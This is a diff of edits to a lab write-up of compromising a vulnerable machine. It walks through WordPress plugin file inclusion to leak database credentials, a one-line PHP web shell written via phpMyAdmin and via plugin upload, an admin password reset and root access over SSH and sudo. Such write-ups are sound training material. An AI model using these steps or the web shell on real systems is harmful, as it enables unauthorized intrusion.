@@ -61,7 +61,7 @@ Elly, make sure you update the payload information. Leave it in your FTP account
 
 ## HTTP
 
-The website is blank page showing that `The requested resource <code class="url">/</code> was not found on this server.`. 
+The website is a blank page showing that `The requested resource <code class="url">/</code> was not found on this server.`. 
 
 A nikto and dirb reveal .profile, and .bashrc are present, showing this is surfacing a home folder. A search for other files, and path traversal, don't find anything, but this might be a candidate for something in future.
 
@@ -126,11 +126,11 @@ drwxr-xr-x 16 root root 4.0K Jun  3 22:06 ..
 drwx------  3 root root 4.0K Jun  5 15:32 systemd-private-df2bff9b90164a2eadc490c0b8f76087-systemd-timesyncd.service-vFKoxJ
 ```
 
-Which does look like the possible content of the actual tmp dir on the machine. Importantly, I discover I can actually upload files into this tmp dir. Hmm.
+Which does look like the possible content of the actual `/var/tmp` or `/tmp` dir on the machine. Importantly, I discover I can actually upload files into this tmp dir. Hmm.
 
 ## Port 12380
 
-I had taken a look at this earlier with nc, but hadn't gotten far. I probably should have guessed it was a http/https port given it is basically 123 port 80 when read. I tested this now, given the wordpress archive. 
+I had taken a look at this earlier with nc, but hadn't gotten far. I probably should have guessed it was a http/https port given it is basically `123 port 80` when read. I tested for this now, given the wordpress archive found earlier. 
 
 Sure enough, `http://192.168.1.74:12380` shows a holding page, with nothing interesting except an uncommon response header `dave: something doesn't look quite right here`. 
 
@@ -138,7 +138,7 @@ A nikto scan suggests the site has a ssl configured, and when I browse to `https
 
 The robots.txt file contained two entries: `admin112233` and `blogblog`. The first took me to a xss page, that posts a warning message about BeEF hooks (a way to use xss to exploit user browser sessions via a tool called BeEF) before redirecting to xss-payloads.com. Accessing the site wiothout javascript (or via burp) reveals nothing except a congratulations for not falling to a script attack.
 
-However, browsing to /blogblog/ reveals the wordpress site I am looking for!
+However, browsing to `/blogblog/` reveals the wordpress site I am looking for!
 
 ## WordPress and plugins
 
@@ -146,7 +146,7 @@ Browsing through the site I found a post indicating that said `The only thing re
 
 I did a wordpress scan against the site, with aggresive searching for plugins, and found several (these were also listed under the listable `wp-content/plugins` directory). The first that I checked, `advanced-video-embed-embed-videos-or-playlists`, had a [public exploit-db entry](https://www.exploit-db.com/exploits/39646) for local file inclusion.
 
-Using this I created a post whose jpeg thumbnail was actually the wp-config.php file, which I grabbed via `wget` and catted to reveal the root credentials of mysql on the box:
+Using this I created a post whose jpeg thumbnail was actually the `wp-config.php` file, which I grabbed via `wget` and catted to reveal the root credentials of mysql on the box:
 
 ```
 kali@kali:~$ cat 152396061.jpeg 
@@ -240,7 +240,7 @@ I could use the above to log into phpmyadmin, discovered when I did a dirb befor
 
 In phpmyadmin I could use the SQL command window to upload a php shell to /tmp: `SELECT "<?php system($_GET['cmd']); ?>" into outfile "/tmp/cmd.php"`, which I then checked via the smbclient from before to confirm that yes, /tmp is being shared. Given I could have also uploaded the shell over smb this didn't give me much however.
 
-I went to the wordpress database, the wp_users table and found the admin user, John. Via the phpmyadmin interface I was able to reset John's password to `hacktheplanet` encoded with MD5 (all done through the interface). This allowed me to then log in to wordpress through wp-admin.
+I went to the wordpress database and the wp_users table and found the admin user, John. Via the phpmyadmin interface I was able to reset John's password to `hacktheplanet` encoded with MD5 (all done through the interface). This allowed me to then log in to wordpress through wp-admin.
 
 As the admin I poked around, and at the suggestion of a hacker friend of mine used the interface to 'add a new plugin'. The plugin process wouldn't work without FTP credentials, however anything I selected as a plugin would get uploaded to `wp-content/uploads`. I uploaded a cmd.php file (containing just `<?php system($_GET['cmd']); ?>` as above) and sure enough, `:12380/blogblog/wp-content/uploads/cmd.php?cmd=whoami` gave me that magic `www-data` in the window.
 
@@ -302,7 +302,7 @@ exit
 exit
 ```
 
-I used the credentials for peter, above, to ssh on the box. A sudo -l for Peter revealed he had complete access, so `sudo -i` followed by `cd /root` got me the flag :)
+I used the credentials for peter, above, to ssh on to the box. A sudo -l for Peter revealed he had complete access, so `sudo -i` followed by `cd /root` got me the flag :)
 
 ```
 ~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
